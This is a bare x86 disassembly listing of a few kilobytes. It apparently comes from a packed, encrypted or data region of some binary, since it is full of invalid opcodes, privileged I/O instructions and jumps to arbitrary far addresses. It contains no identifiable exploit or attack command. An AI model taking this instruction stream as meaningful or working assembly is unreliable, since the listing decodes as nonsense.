  40907b:	(bad)  
  40907c:	pusha  
  40907d:	xor    al,0xf2
  40907f:	fs mov ebx,0x5db2a0b9
  409085:	mov    dh,0x19
  409087:	inc    esi
  409088:	cld    
  409089:	aad    0x55
  40908b:	sar    BYTE PTR [ebx-0x21],1
  40908e:	jo     0x409018
  409090:	adc    esp,DWORD PTR ds:0xa43ca2be
  409096:	add    dl,BYTE PTR [ecx+0xf]
  409099:	cld    
  40909a:	ror    bh,cl
  40909c:	jmp    0x39e4:0x728b4b53
  4090a3:	in     al,0x5b
  4090a5:	sar    BYTE PTR [esi+0x17],0x44
  4090a9:	mov    ecx,0x374158bf
  4090ae:	adc    DWORD PTR [edi-0x62eed0d9],0x4c374d9f
  4090b8:	cmp    eax,0xdf832bd4
  4090bd:	mov    ebp,DWORD PTR [ebx-0xb]
  4090c0:	add    ebx,ebp
  4090c2:	je     0x40913d
  4090c4:	dec    esi
  4090c5:	ficom  WORD PTR [edx+0x27ef30e4]
  4090cb:	adc    eax,0xa14c81d7
  4090d0:	or     eax,0xf86dbdd2
  4090d5:	pop    ds
  4090d6:	inc    ecx
  4090d7:	sbb    eax,0x9292f392
  4090dc:	pop    ds
  4090dd:	dec    ebx
  4090de:	gs xor al,0xec
  4090e1:	stc    
  4090e2:	and    al,0x80
  4090e4:	mov    esi,DWORD PTR [edx]
  4090e6:	leave  
  4090e7:	fcom   DWORD PTR [ecx+0xb76e48d]
  4090ed:	aas    
  4090ee:	lahf   
  4090ef:	inc    ecx
  4090f0:	outs   dx,BYTE PTR ds:[esi]
  4090f1:	push   esp
  4090f2:	xor    bh,dl
  4090f4:	ficom  DWORD PTR [edx-0x33]
  4090f7:	stc    
  4090f8:	jne    0x40914c
  4090fa:	pop    ss
  4090fb:	ret    0xf35f
  4090fe:	dec    ecx
  4090ff:	pusha  
  409100:	xor    DWORD PTR [edi+0x3bd2354d],ecx
  409106:	aad    0x38
  409108:	cld    
  409109:	mov    al,0x42
  40910b:	mov    ebp,0xcce1cb51
  409110:	enter  0x1dc0,0x3
  409114:	fs in  al,0x83
  409117:	mov    esp,0x402731f4
  40911c:	loop   0x4090dd
  40911e:	imul   BYTE PTR [esi+ebx*8-0x1]
  409122:	ror    DWORD PTR [edi],0x90
  409125:	pop    esi
  409126:	in     eax,0xdb
  409128:	inc    eax
  409129:	sub    esp,ebp
  40912b:	cmp    edi,edi
  40912d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40912e:	and    BYTE PTR [ebx+0x37d5d0cf],bl
  409134:	jge    0x409104
  409136:	sub    esi,DWORD PTR [ebp+ebp*8-0x54fdfd01]
  40913d:	sbb    eax,0x42fc0a17
  409142:	inc    ebx
  409143:	fisubr DWORD PTR [eax]
  409145:	icebp  
  409146:	(bad)  
  409147:	in     al,dx
  409148:	pop    edx
  409149:	jb     0x40914b
  40914b:	xor    BYTE PTR [ebp-0x4],ah
  40914e:	xlat   BYTE PTR ds:[ebx]
  40914f:	push   0x91f1a10f
  409154:	and    BYTE PTR [ebx+0x604fc7a2],ch
  40915a:	setns  BYTE PTR [esp+eiz*4]
  40915e:	pop    ss
  40915f:	jns    0x409190
  409161:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409162:	cwde   
  409163:	cmp    DWORD PTR [edi+0x486cff7e],0x23
  40916a:	jne    0x4091d3
  40916c:	sub    ebp,DWORD PTR [esi-0x2b]
  40916f:	cld    
  409170:	push   esp
  409171:	xor    al,0x96
  409173:	pop    ds
  409174:	and    eax,0xa2e836e6
  409179:	xor    esp,DWORD PTR [edi-0x35]
  40917c:	test   BYTE PTR fs:[edi+0xf],ch
  409180:	lds    edx,FWORD PTR [eax+0x51]
  409183:	pop    DWORD PTR [edx+0x71]
  409186:	or     edi,DWORD PTR [ecx-0x7a]
  409189:	and    eax,0x9100f3ea
  40918e:	mov    ds:0x753d1988,al
  409193:	jg     0x4091f9
  409195:	cli    
  409196:	pcmpeqw mm5,mm5
  409199:	(bad)  
  40919a:	dec    esi
  40919b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40919c:	mov    eax,0xfd58427a
  4091a1:	scas   al,BYTE PTR es:[edi]
  4091a2:	xchg   edx,eax
  4091a3:	jmp    0x409163
  4091a5:	jl     0x409166
  4091a7:	imul   ecx,DWORD PTR [ebp-0x21],0xfffffff1
  4091ab:	scas   eax,DWORD PTR es:[edi]
  4091ac:	xchg   ecx,eax
  4091ad:	xor    esp,DWORD PTR [ebx]
  4091af:	out    0x7e,eax
  4091b1:	and    DWORD PTR [eax+0x5daa5dd6],0x91613dfd
  4091bb:	xchg   esp,eax
  4091bc:	or     ecx,DWORD PTR [ecx]
  4091be:	repnz inc esi
  4091c0:	dec    ebx
  4091c1:	loope  0x40914c
  4091c3:	push   edx
  4091c4:	loope  0x40922e
  4091c6:	sub    al,0x13
  4091c8:	pop    esi
  4091c9:	scas   al,BYTE PTR es:[edi]
  4091ca:	mov    esp,0x97a7e909
  4091cf:	adc    al,0x5b
  4091d1:	lods   eax,DWORD PTR ds:[esi]
  4091d2:	jmp    0x409172
  4091d4:	mov    esp,0xfce13510
  4091d9:	data16 jo 0x409238
  4091dc:	mov    ch,0x13
  4091de:	cmc    
  4091df:	pop    edi
  4091e0:	out    dx,al
  4091e1:	push   0xffffff89
  4091e3:	out    dx,eax
  4091e4:	jnp    0x40923a
  4091e6:	xchg   ebx,eax
  4091e7:	ret    0x3cc9
  4091ea:	les    ebp,FWORD PTR [ecx-0x17]
  4091ed:	stos   DWORD PTR es:[edi],eax
  4091ee:	mov    edx,0x2daf2481
  4091f3:	mov    edi,0x474becea
  4091f8:	sbb    al,0x27
  4091fa:	loope  0x409249
  4091fc:	frstor [edi-0x4309b4a6]
  409202:	lea    ebp,[eax]
  409204:	adc    DWORD PTR ss:[ebp+0x66],ebp
  409208:	aas    
  409209:	scas   al,BYTE PTR es:[edi]
  40920a:	mov    bl,0xf9
  40920c:	cli    
  40920d:	xchg   BYTE PTR [edi],dh
  40920f:	or     eax,0x83983dd0
  409214:	rol    BYTE PTR [esi+0x65f220bf],1
  40921a:	jns    0x409204
  40921c:	xchg   esi,eax
  40921d:	lds    esi,FWORD PTR [ebx-0x76ebc1e2]
  409223:	je     0x409215
  409225:	jge    0x4091c7
  409227:	cs dec ebx
  409229:	shl    BYTE PTR [eax+0x62],1
  40922c:	scas   eax,DWORD PTR es:[edi]
  40922d:	mov    ecx,0x503c7664
  409232:	cmp    ebx,DWORD PTR [edx-0x5e]
  409235:	inc    edx
  409236:	and    DWORD PTR [edx+0x3c34c0d5],esp
  40923c:	mov    ebx,0xcc3cef0f
  409241:	xor    al,BYTE PTR [eax+0x37a3d2e5]
  409247:	add    al,0x65
  409249:	sub    dl,dl
  40924b:	sbb    BYTE PTR [edx],ah
  40924d:	addr16 loopne 0x409251
  409250:	std    
  409251:	(bad)
  409254:	push   DWORD PTR [ecx+0x32]
  409257:	sub    ebx,DWORD PTR [ebx]
  409259:	sbb    al,0xde
  40925b:	es lock sahf 
  40925e:	xor    DWORD PTR [edi+0x6],eax
  409261:	mov    ds:0xd2771821,al
  409266:	adc    dh,BYTE PTR [ecx+ebx*8-0x36866ef5]
  40926d:	xlat   BYTE PTR ds:[ebx]
  40926f:	pop    esp
  409270:	adc    BYTE PTR [ebp+0x7f],al
  409273:	xor    eax,0xd5e8f9cb
  409278:	call   0x2506af82
  40927d:	jl     0x4092f6
  40927f:	clc    
  409280:	call   0x18d2bc21
  409285:	mov    fs,WORD PTR ds:0x993d3f5c
  40928b:	adc    BYTE PTR [ecx-0x26ef5fcf],cl
  409291:	xchg   edi,eax
  409292:	mov    ebx,DWORD PTR [ebp+0x31]
  409295:	add    ah,BYTE PTR ds:[ebx]
  409298:	pop    esp
  409299:	pop    edi
  40929a:	ror    BYTE PTR ds:0xc30872ee,cl
  4092a0:	mov    ebx,0x1459592
  4092a5:	and    BYTE PTR [esi],bh
  4092a7:	dec    edi
  4092a8:	imul   eax,esp,0x38
  4092ab:	xchg   edi,esp
  4092ad:	dec    eax
  4092ae:	rol    BYTE PTR [ebp+0x47],0xf5
  4092b2:	je     0x409285
  4092b4:	mov    esi,0x9e1d93e7
  4092b9:	mov    ah,0x8e
  4092bb:	scas   eax,DWORD PTR es:[edi]
  4092bc:	push   edi
  4092bd:	push   DWORD PTR [ecx+eiz*8]
  4092c0:	dec    eax
  4092c1:	sbb    DWORD PTR [esp+eax*4-0x45],eax
  4092c5:	xchg   ebx,eax
  4092c6:	call   DWORD PTR [edi-0x60515ff3]
  4092cc:	cmp    DWORD PTR [edi-0x60],edi
  4092cf:	mov    ds:0x859453b1,al
  4092d4:	loope  0x4092fa
  4092d6:	test   DWORD PTR [eax-0x5f],edx
  4092d9:	iret   
  4092da:	call   0x2a8585a4
  4092df:	jb     0x4092e0
  4092e1:	and    eax,0x949fbdd3
  4092e6:	imul   esp,edx,0xffffffb0
  4092e9:	(bad)  
  4092ea:	cwde   
  4092eb:	lds    ebp,FWORD PTR ds:0x5e70f2d
  4092f1:	jmp    0x40928b
  4092f3:	inc    ebp
  4092f4:	mov    ds:0x37c8be06,al
  4092f9:	mov    ebx,0xc771e42f
  4092fe:	fisttp DWORD PTR [ebx+edx*4]
  409301:	fisttp QWORD PTR [edi+0x8]
  409304:	mov    eax,0x20529e7e
  409309:	cmp    dh,BYTE PTR [ebp-0x7e]
  40930c:	cmp    ebp,DWORD PTR [esi]
  40930e:	mov    dh,0x36
  409310:	jg     0x40933e
  409312:	xchg   edx,eax
  409313:	and    DWORD PTR [edi],esi
  409315:	out    0x92,al
  409317:	bound  ecx,QWORD PTR [edx-0x63da2f08]
  40931d:	mov    WORD PTR [ecx+ecx*4+0x537daf10],?
  409324:	cdq    
  409325:	mov    bl,0x1e
  409327:	push   eax
  409328:	(bad)  [ebx]
  40932a:	daa    
  40932b:	cmc    
  40932c:	dec    ebx
  40932d:	test   al,0xd6
  40932f:	xchg   esp,edx
  409331:	jmp    0x5c45:0xc519d270
  409338:	adc    BYTE PTR [eax+0x63],cl
  40933b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40933c:	scas   eax,DWORD PTR es:[edi]
  40933d:	loop   0x409332
  40933f:	xchg   esi,eax
  409340:	xchg   ebx,eax
  409341:	xchg   edx,eax
  409342:	dec    esp
  409343:	xchg   ebx,eax
  409344:	mov    dl,ch
  409346:	jb     0x409346
  409348:	xor    DWORD PTR [eax-0x35],0xb0557341
  40934f:	and    al,BYTE PTR [edx+0x1c]
  409352:	push   0xf9ffe164
  409357:	push   edx
  409358:	inc    eax
  409359:	dec    esp
  40935a:	push   ebp
  40935b:	pushf  
  40935c:	and    edx,esp
  40935e:	mov    cl,bh
  409360:	jg     0x40937a
  409362:	inc    ebx
  409363:	pop    esi
  409364:	xchg   esp,eax
  409365:	clc    
  409366:	sub    DWORD PTR [esi+0x5e045e5a],esi
  40936c:	out    dx,al
  40936d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40936e:	and    ebp,DWORD PTR [eax-0x5ad98ccf]
  409374:	adc    BYTE PTR [eax],bl
  409376:	ja     0x4093d7
  409378:	adc    ch,al
  40937a:	sbb    al,0xe6
  40937c:	clc    
  40937d:	int    0x18
  40937f:	mov    esp,0xa62e2406
  409384:	sbb    ah,cl
  409386:	test   BYTE PTR [eax-0x53],al
  409389:	pushf  
  40938a:	push   edx
  40938b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40938c:	xchg   esp,eax
  40938d:	add    dl,BYTE PTR [eax+0x7d18a07b]
  409393:	mov    ds,WORD PTR [ecx-0x34]
  409396:	rcl    BYTE PTR [edx+0x5b825bb],cl
  40939c:	xor    al,0xb8
  40939e:	mov    eax,DWORD PTR [eax+0x4bc6c6f5]
  4093a4:	push   edi
  4093a5:	jo     0x40934b
  4093a7:	out    0xa0,eax
  4093a9:	mov    BYTE PTR [esi-0x7d],ah
  4093ac:	ror    ch,0xa7
  4093af:	(bad)  
  4093b0:	and    DWORD PTR [ebx-0x1d],ecx
  4093b3:	aas    
  4093b4:	mov    edi,?
  4093b6:	sbb    bh,BYTE PTR [edx+eiz*4]
  4093b9:	cld    
  4093ba:	sub    eax,0xc15f4590
  4093bf:	and    al,0x84
  4093c1:	or     al,BYTE PTR [esi+0xf]
  4093c4:	pop    esi
  4093c5:	xchg   ecx,eax
  4093c6:	mov    BYTE PTR [ebx],dh
  4093c8:	and    bl,BYTE PTR [edi]
  4093ca:	repz inc esi
  4093cc:	scas   al,BYTE PTR es:[edi]
  4093cd:	jmp    0xb2c04280
  4093d2:	and    ch,BYTE PTR [esi-0x2e]
  4093d5:	(bad)  
  4093d7:	idiv   BYTE PTR cs:[esi]
  4093da:	outs   dx,BYTE PTR ds:[esi]
  4093db:	test   eax,0x2ca60801
  4093e0:	pop    es
  4093e1:	(bad)  
  4093e2:	js     0x4093fa
  4093e4:	xlat   BYTE PTR ds:[ebx]
  4093e5:	pop    eax
  4093e6:	add    bh,bl
  4093e8:	stc    
  4093e9:	or     BYTE PTR [esi+0x78ea433b],dl
  4093ef:	inc    edi
  4093f0:	outs   dx,BYTE PTR ds:[esi]
  4093f1:	push   edi
  4093f2:	mov    DWORD PTR [edx+0x75],esp
  4093f5:	(bad)  
  4093f6:	and    esp,esp
  4093f8:	shl    BYTE PTR [eax+ebp*1-0x1a],1
  4093fc:	inc    DWORD PTR [edx-0x65]
  4093ff:	int    0xd6
  409401:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409402:	lahf   
  409403:	mov    dh,0x72
  409405:	clc    
  409406:	dec    ecx
  409407:	mov    edi,0x55ded6dc
  40940c:	mov    eax,0x8cf4a8a7
  409411:	sub    esp,DWORD PTR [ebx-0x3f]
  409414:	lods   eax,DWORD PTR ds:[esi]
  409415:	mov    ebx,0x994905d5
  40941a:	pop    es
  40941b:	xchg   ecx,eax
  40941c:	push   ebx
  40941d:	mov    dl,0xf7
  40941f:	cmp    esp,ebx
  409421:	sar    BYTE PTR [ecx+0x37],1
  409424:	sub    al,BYTE PTR [eax-0x66]
  409427:	sub    esp,DWORD PTR [edi+ecx*4+0x6d]
  40942b:	dec    edi
  40942c:	jmp    0xaef46755
  409431:	out    dx,eax
  409432:	inc    ebp
  409433:	cdq    
  409434:	jo     0x409493
  409436:	mov    dl,0xd2
  409438:	(bad)  
  409439:	int3   
  40943a:	mov    bh,0x7c
  40943c:	dec    esp
  40943d:	(bad)  
  40943f:	popf   
  409440:	pop    edx
  409441:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409442:	jmp    0x40949b
  409444:	mov    dh,0xf
  409446:	repnz fadd DWORD PTR ss:[esi+0x21]
  40944b:	jne    0x4094a9
  40944d:	mov    dh,0xca
  40944f:	cmp    eax,0x1c86ecfb
  409454:	pop    ds
  409455:	or     bh,BYTE PTR [ecx]
  409457:	(bad)  [esi-0x7e]
  40945a:	dec    eax
  40945b:	fwait
  40945c:	mov    cs,edx
  40945e:	test   ebx,esp
  409460:	or     DWORD PTR ds:0xdf65120a,edi
  409466:	test   eax,0xf46b42d1
  40946b:	fucomip st,st(4)
  40946d:	jl     0x409488
  40946f:	pop    ebx
  409470:	mov    bl,0x7a
  409472:	push   ss
  409473:	inc    eax
  409474:	add    DWORD PTR [eax],ecx
  409476:	sub    eax,DWORD PTR [edi+0x11]
  409479:	fistp  QWORD PTR [ecx-0x1d]
  40947c:	mov    eax,0x555cefac
  409481:	aam    0xe1
  409483:	sub    al,0x79
  409485:	iret   
  409486:	add    BYTE PTR [ebp+0x28000d10],ch
  40948c:	mov    edi,0x21137d59
  409491:	dec    ebp
  409492:	xchg   ecx,eax
  409493:	retf   0xf66a
  409496:	(bad)  
  409497:	adc    BYTE PTR [edx+0x4b],dh
  40949a:	pop    eax
  40949b:	jecxz  0x4094a6
  40949d:	rol    BYTE PTR ds:0x18f978f,cl
  4094a3:	xchg   ebp,eax
  4094a4:	cld    
  4094a5:	add    DWORD PTR [ebp-0x9],ebp
  4094a8:	inc    edi
  4094a9:	pop    ecx
  4094aa:	stos   BYTE PTR es:[edi],al
  4094ab:	dec    esi
  4094ac:	cmp    al,0x2c
  4094ae:	lods   eax,DWORD PTR ds:[esi]
  4094af:	inc    ebp
  4094b0:	mov    edx,0x5951fc78
  4094b5:	dec    eax
  4094b6:	pop    ds
  4094b7:	mov    dl,BYTE PTR [ecx-0x73d33f35]
  4094bd:	jne    0x4094f8
  4094bf:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  4094c1:	test   DWORD PTR [edi-0x5c],esp
  4094c4:	clc    
  4094c5:	loope  0x409480
  4094c7:	aad    0x4e
  4094c9:	mov    WORD PTR [esi+esi*8-0x58],es
  4094cd:	arpl   WORD PTR [esi-0x397dbff0],ax
  4094d3:	fld    st(2)
  4094d5:	add    DWORD PTR [edi-0x6],ebp
  4094d8:	mov    al,ds:0x6d6ae03e
  4094dd:	test   DWORD PTR [eax-0x3c],0xe357e7b2
  4094e4:	popa   
  4094e5:	arpl   cx,sp
  4094e7:	cmp    DWORD PTR [eax],ecx
  4094e9:	jne    0x4094ff
  4094eb:	lods   al,BYTE PTR ds:[esi]
  4094ec:	or     eax,0x191ff7ce
  4094f1:	daa    
  4094f2:	ret    0x784d
  4094f5:	jmp    0x409510
  4094f7:	ss ret 
  4094f9:	mov    eax,DWORD PTR [ecx]
  4094fb:	pop    ds
  4094fc:	push   ebx
  4094fd:	pop    esi
  4094fe:	xor    al,0x2
  409500:	jmp    0xec26a11e
  409505:	dec    esi
  409506:	call   0x8d726754
  40950b:	xchg   ebx,eax
  40950c:	xchg   ebx,edx
  40950e:	xor    bh,cl
  409510:	in     al,dx
  409511:	imul   edx,DWORD PTR [ebx],0x5a
  409514:	mov    ah,0xb3
  409516:	and    eax,0x5e714fa5
  40951b:	aas    
  40951c:	dec    esp
  40951d:	int3   
  40951e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40951f:	jl     0x40954b
  409521:	fwait
  409522:	jnp    0x4094ef
  409524:	(bad)
  409528:	int3   
  409529:	pop    ds
  40952a:	jae    0x4094d6
  40952c:	add    al,0x38
  40952e:	pop    es
  40952f:	push   es
  409530:	test   cl,dh
  409532:	pushf  
  409533:	adc    ebx,DWORD PTR [ebx-0x5377e145]
  409539:	push   ecx
  40953a:	mov    ds:0x8fc25f4b,eax
  40953f:	(bad)  
  409540:	call   0x63293cda
  409545:	pop    ss
  409546:	test   eax,0x2566da8
  40954b:	iret   
  40954c:	pop    eax
  40954d:	(bad)  [edx+ebx*8+0xe28a2cc]
  409554:	stos   DWORD PTR es:[edi],eax
  409555:	jae    0x4094ff
  409557:	in     al,0x9d
  409559:	ds inc ebx
  40955b:	test   eax,0xbc111191
  409560:	adc    BYTE PTR [edi+0x403f9cf6],0xd0
  409567:	mov    cl,0x44
  409569:	xchg   eax,edi
  40956b:	pop    ebx
  40956c:	ins    DWORD PTR es:[edi],dx
  40956d:	(bad)  
  40956e:	fldenv [edx+esi*4]
  409571:	adc    eax,0xa3743fa2
  409576:	lock call 0xf7cf:0x48cb588b
  40957e:	xchg   BYTE PTR [eax],dl
  409580:	les    edx,FWORD PTR [esi+ebp*4+0x51]
  409584:	mov    gs,WORD PTR [edx+0x6f]
  409587:	call   0x5105:0xc9713611
  40958e:	push   edi
  40958f:	xor    edi,esp
  409591:	pushf  
  409592:	stc    
  409593:	bound  esp,QWORD PTR [ecx+0x30]
  409596:	xor    edx,DWORD PTR [esi-0x6f078f15]
  40959c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40959d:	iret   
  40959e:	repz adc BYTE PTR [ebx-0x61],bh
  4095a2:	mov    edi,0x73babb3c
  4095a7:	call   0x5629:0x8e8c010f
  4095ae:	call   0x49b9:0x9bf7a2ed
  4095b5:	push   es
  4095b6:	xor    BYTE PTR [ecx],bh
  4095b8:	sbb    ebp,0x69
  4095bb:	sbb    eax,0x85a6da38
  4095c0:	jp     0x40955b
  4095c2:	fdiv   DWORD PTR [esi+0x4]
  4095c5:	mul    DWORD PTR [eax+edi*4+0x22]
  4095c9:	in     eax,0x18
  4095cb:	shl    DWORD PTR [ebp+0x30],1
  4095ce:	std    
  4095cf:	inc    edi
  4095d0:	pop    edi
  4095d1:	inc    ecx
  4095d2:	lods   al,BYTE PTR ds:[esi]
  4095d3:	out    dx,eax
  4095d4:	xchg   ecx,eax
  4095d5:	mov    ebp,0xbb990980
  4095da:	popf   
  4095db:	or     DWORD PTR [ebp-0xbecbe18],esi
  4095e1:	ss retf 
  4095e3:	(bad)
  4095e6:	cdq    
  4095e7:	shr    DWORD PTR [esi+ecx*8+0x285bf060],1
  4095ee:	xchg   BYTE PTR [ebx-0x30abc107],dh
  4095f4:	ss adc al,0xb9
  4095f7:	pop    edi
  4095f8:	jmp    0x4095d1
  4095fa:	adc    al,0xaf
  4095fc:	xlat   BYTE PTR ds:[ebx]
  4095fd:	clc    
  4095fe:	push   ss
  4095ff:	mov    ss,WORD PTR [ebx-0x5b]
  409602:	in     al,dx
  409603:	fcomp  DWORD PTR [eax-0x74700409]
  409609:	xchg   DWORD PTR [edx+eiz*2-0x54],esp
  40960d:	mov    dh,BYTE PTR [ecx]
  40960f:	fisubr DWORD PTR [edi+0x6a]
  409612:	push   ebp
  409613:	fucom  st(5)
  409615:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409616:	pop    ecx
  409617:	add    BYTE PTR [esi-0x5f],cl
  40961a:	mov    BYTE PTR [edi+0x29],cl
  40961d:	adc    al,0x7e
  40961f:	mov    ebp,0x29377b55
  409624:	lea    ebp,[ecx+ebp*4]
  409627:	mov    DWORD PTR [ebx+0x12],0x2103b8e3
  40962e:	push   eax
  40962f:	sbb    eax,0xa2d88b8
  409634:	pop    es
  409635:	das    
  409636:	(bad)
  40963b:	pop    edi
  40963c:	js     0x4095ee
  40963e:	lea    ecx,[ebx]
  409640:	les    esi,FWORD PTR [esi+0x40]
  409643:	inc    ecx
  409644:	mov    bl,0xba
  409646:	xchg   edx,eax
  409647:	jae    0x409693
  409649:	(bad)  
  40964a:	popf   
  40964b:	pmaxub mm4,QWORD PTR [ecx+0x45]
  40964f:	add    DWORD PTR [eax-0x26514e08],ebx
  409655:	sar    BYTE PTR [edi-0x1e],0x3b
  409659:	fist   DWORD PTR [edi]
  40965b:	sbb    BYTE PTR [esi+0x31],bh
  40965e:	jno    0x40966c
  409660:	mov    ds:0x9ea0f7f3,eax
  409665:	sbb    al,cl
  409667:	mov    edi,0xf07ba09b
  40966c:	dec    eax
  40966d:	test   al,0xef
  40966f:	dec    ebp
  409670:	ss jne 0x4095fb
  409673:	or     DWORD PTR [esi+0x6b],eax
  409676:	mov    bl,0x23
  409678:	lods   eax,DWORD PTR ds:[esi]
  409679:	outs   dx,BYTE PTR ds:[esi]
  40967a:	dec    ecx
  40967b:	add    DWORD PTR [ebx+0x6e78ddc1],edi
  409681:	cmp    eax,0xde7283b8
  409686:	das    
  409687:	or     eax,0xcf4bcdac
  40968c:	outs   dx,DWORD PTR ds:[esi]
  40968d:	fs nop
  40968f:	pop    edx
  409690:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409691:	jb     0x4096dc
  409693:	repz push ds
  409695:	mov    ebx,0x505652d2
  40969a:	cmp    ch,BYTE PTR [ebx-0x15]
  40969d:	out    dx,eax
  40969e:	nop
  40969f:	sahf   
  4096a0:	sub    al,0xe6
  4096a2:	pop    edi
  4096a3:	xor    ebx,edi
  4096a5:	lock stos DWORD PTR es:[edi],eax
  4096a7:	sbb    eax,0xd6228cf2
  4096ac:	fild   QWORD PTR [ecx-0x8f050b2]
  4096b2:	xor    ecx,edi
  4096b4:	xlat   BYTE PTR gs:[ebx]
  4096b6:	cmp    eax,DWORD PTR [ebx]
  4096b8:	rcl    BYTE PTR [ebx-0x43aa1fbc],1
  4096be:	loope  0x409665
  4096c0:	stos   DWORD PTR es:[edi],eax
  4096c1:	dec    ebp
  4096c2:	sbb    ecx,edi
  4096c4:	shr    DWORD PTR [esi+0x55fba58b],cl
  4096ca:	cmp    al,0xf2
  4096cc:	aam    0xdb
  4096ce:	sub    DWORD PTR [ecx+ebp*8-0x70],ebp
  4096d2:	sub    BYTE PTR [edi-0x20f52640],0x14
  4096d9:	mov    dh,0x7b
  4096db:	cmp    cl,BYTE PTR [eax]
  4096dd:	cld    
  4096de:	push   ss
  4096df:	and    esi,ebx
  4096e1:	add    edx,DWORD PTR [edi-0x44c1a901]
  4096e7:	inc    ecx
  4096e8:	push   edx
  4096e9:	ret    0xfef4
  4096ec:	push   ds
  4096ed:	dec    edi
  4096ee:	or     BYTE PTR [ecx],ah
  4096f0:	mov    al,ds:0x84fae689
  4096f5:	and    ah,dl
  4096f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4096f8:	pop    ebx
  4096f9:	fsub   DWORD PTR [ebx-0x509adb6d]
  4096ff:	dec    edx
  409700:	(bad)  
  409701:	pop    ecx
  409702:	das    
  409703:	sbb    al,0x72
  409705:	popf   
  409706:	xchg   esi,eax
  409707:	inc    ebx
  409708:	arpl   WORD PTR [ebx+0xe8bd30b],sp
  40970e:	sbb    eax,0x9dd2aad9
  409713:	or     BYTE PTR [esp+edx*1-0x22fd10f2],ch
  40971a:	mov    cl,BYTE PTR [ecx+0x1c816e36]
  409720:	mov    WORD PTR [edx+0x4e98adf1],fs
  409726:	mov    edi,0x12339496
  40972b:	lds    edi,FWORD PTR [edx+0x70]
  40972e:	push   ss
  40972f:	mov    WORD PTR [edi+0x5f],?
  409732:	dec    ecx
  409733:	mov    ds:0xe07ee09d,eax
  409738:	out    dx,eax
  409739:	cmp    eax,0xe1150a6d
  40973e:	mov    cl,0xe6
  409740:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409741:	pop    eax
  409742:	or     ch,BYTE PTR [eax]
  409744:	sar    edx,1
  409746:	pop    edi
  409747:	adc    BYTE PTR [esi],al
  409749:	sar    DWORD PTR [eax-0x1fa58e00],1
  40974f:	imul   edi,DWORD PTR [edx-0x60],0xccc176be
  409756:	mov    edi,DWORD PTR [edi]
  409758:	pop    ebx
  409759:	push   edi
  40975a:	adc    DWORD PTR [ebx+0x4e],0xffffffbe
  40975e:	push   ebx
  40975f:	dec    DWORD PTR [esi]
  409761:	not    BYTE PTR [edi+0x47]
  409764:	fs icebp 
  409766:	rol    DWORD PTR [edx-0x1a],cl
  409769:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40976a:	hlt    
  40976b:	mov    esp,DWORD PTR es:[ebx+esi*4-0x37]
  409770:	cmp    BYTE PTR [edx],0xa8
  409773:	xchg   esp,eax
  409774:	std    
  409775:	push   ecx
  409776:	dec    esi
  409777:	stc    
  409778:	sbb    ebp,DWORD PTR [eax+eax*2-0x4d188895]
  40977f:	aaa    
  409780:	out    dx,al
  409781:	pop    ebp
  409782:	es mov ebx,0x5de7b0d7
  409788:	std    
  409789:	xchg   edx,eax
  40978a:	push   edx
  40978b:	mov    esp,0x9fb7ba3b
  409790:	(bad)  
  409791:	out    0xc,al
  409793:	sub    eax,0x48b3f413
  409798:	ins    DWORD PTR es:[edi],dx
  409799:	mov    ah,0x7f
  40979b:	cdq    
  40979c:	adc    al,0x7f
  40979e:	mov    esi,0xfe167d2c
  4097a3:	or     BYTE PTR [esi+eiz*1-0x7e],bh
  4097a7:	mov    eax,0x1634edbf
  4097ac:	cdq    
  4097ad:	popa   
  4097ae:	pusha  
  4097af:	and    bl,BYTE PTR [eax]
  4097b1:	adc    bh,dh
  4097b3:	add    edi,DWORD PTR [eax-0x35]
  4097b6:	or     ebp,DWORD PTR [eax*4-0x368eca3a]
  4097bd:	out    dx,al
  4097be:	and    dl,dl
  4097c0:	dec    ebx
  4097c1:	adc    edx,eax
  4097c3:	cwde   
  4097c4:	xchg   esi,eax
  4097c5:	sti    
  4097c6:	inc    edi
  4097c7:	mov    eax,0x9b8c415
  4097cc:	repnz sub BYTE PTR es:[ecx+edi*4],ah
  4097d1:	out    0xa2,eax
  4097d3:	mov    dl,0x60
  4097d5:	sbb    ah,BYTE PTR [edi+0x509be6]
  4097db:	rol    DWORD PTR [ebx],1
  4097dd:	inc    ebp
  4097de:	div    ebx
  4097e0:	call   0x47a1:0xb82625c8
  4097e7:	push   esp
  4097e8:	aad    0x5f
  4097ea:	mov    esi,0x8f82c63f
  4097ef:	sub    eax,0x63e051fa
  4097f4:	jbe    0x40986d
  4097f6:	in     eax,dx
  4097f7:	jg     0x917077ec
  4097fd:	and    BYTE PTR [esi+0x29],dh
  409800:	loope  0x4097b0
  409802:	cmp    al,0xaa
  409804:	cmp    BYTE PTR [edx+0xd],ah
  409807:	retf   
  409808:	clc    
  409809:	(bad)  [eax-0x39]
  40980c:	jp     0x4097cd
  40980e:	repz les ebx,FWORD PTR [ecx]
  409811:	fincstp 
  409813:	jle    0x40982d
  409815:	ret    0xc0ba
  409818:	hlt    
  409819:	cmp    eax,0x66b97b80
  40981e:	arpl   sp,ax
  409820:	mov    ah,0xbb
  409823:	adc    ch,BYTE PTR [edi]
  409825:	jbe    0x409894
  409827:	call   0x9971:0x73f016b
  40982e:	xor    edi,DWORD PTR ds:0xbb71a76f
  409834:	leave  
  409835:	in     al,dx
  409836:	pop    esi
  409837:	fbld   TBYTE PTR [ebx-0x23]
  40983a:	and    ecx,esp
  40983c:	sbb    ebp,DWORD PTR [ebp-0xe]
  40983f:	mov    bl,0xba
  409841:	push   ss
  409842:	test   DWORD PTR [ebp+0x43ee61ee],eax
  409848:	mov    ebp,0xd1203438
  40984d:	add    DWORD PTR [esi+esi*2-0x10f06a62],edx
  409854:	das    
